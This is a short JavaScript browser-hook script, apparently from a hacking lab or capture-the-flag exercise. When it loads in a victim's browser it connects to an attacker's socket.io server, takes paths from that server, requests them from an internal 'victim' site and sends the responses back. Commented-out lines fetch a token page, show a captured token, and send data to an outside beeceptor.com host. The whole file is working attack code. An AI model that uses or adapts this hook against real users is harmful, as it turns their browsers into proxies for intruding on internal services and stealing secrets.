const serverURL = window.location.hostname + ":" + window.location.port;

let token = '';
// let victimURL = 'http://blind_hacker_forum/';
let victimURL = 'http://localhost:3000/';

window.onload = function () {

    const socket = io.connect(serverURL);
    // register hooked browser connection
    socket.emit('browser-connect');

    socket.on('mensaje', function (text_id) {

        // let passwd = data.split('&')[1].split('=')[1]
        // Build formData object.
        // let formData = new FormData();
        // formData.append('username', "admin");
        // formData.append('password', text_id.text);

        // console.log("text:" + text_id.text);
        // console.log("content-type:" + text_id.contentType);

        fetch(victimURL + text_id.text, {
            method: 'GET',
          //  body: text_id.text,
            headers: { 'content-type': text_id.contentType }
        }).then(res => {
            // for (var p of res.headers)
            //     console.log(p);

            if (!res.ok) {
                // make the promise be rejected if we didn't get a 2xx response
                throw new Error("404")
            } else {
                return res.text();
            }
        }).then(data => {
            socket.emit('answer', {data: data, id: text_id.id});
        }).catch(error => {
            socket.emit('answer', {data: "404", id: text_id.id});
        })
    })


    // fetch(victimURL + "token.php").then(res => res.text()).then(data => {
    //     //There you go -> FYsuk1xFzScjXOonVBxIBEqAZAM4AIDmHCPjAmU1
    //     token = data.split(" ")[4];
    //     // fetch("https://ikasten.free.beeceptor.com/" + data);
    //     console.log(token);
    // })

};
